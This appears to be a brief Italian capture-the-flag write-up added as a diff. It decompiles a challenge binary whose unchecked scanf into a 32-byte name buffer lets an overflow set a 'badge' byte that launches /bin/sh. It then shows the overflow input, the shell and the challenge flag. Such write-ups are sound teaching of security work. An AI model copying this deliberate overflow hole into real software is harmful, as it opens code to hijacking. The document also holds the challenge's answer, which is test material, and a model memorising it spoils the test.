@@ -1,0 +1,38 @@
+undefined8 main(EVP_PKEY_CTX *param_1)
+
+{
+  undefined1 local_38 [32];
+  uint local_18;
+  char local_14;
+  
+  init(param_1);
+  local_14 = '\0';
+  puts("Quanti anni hai?");
+  __isoc99_scanf(&DAT_00402019,&local_18);
+  puts("Come ti chiami?");
+  __isoc99_scanf(&DAT_0040202c,local_38);
+  if (local_14 == '\0') {
+    puts("Non hai il badge, mi dispiace.");
+  }
+  else {
+    printf("Ciao %s, bentornato :)\n",local_38);
+    printf("Hai %d anni.\n",(ulong)local_18);
+    system("/bin/sh");
+  }
+  return 0
+}
+
+
+-------------------------------------------
+| scanf(local_38) vulnerabile a overflow. |
+-------------------------------------------
+
+
+Quanti anni hai?
+5
+
+Come ti chiami?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+$cat flag
+flag{b4d_sc4nf}
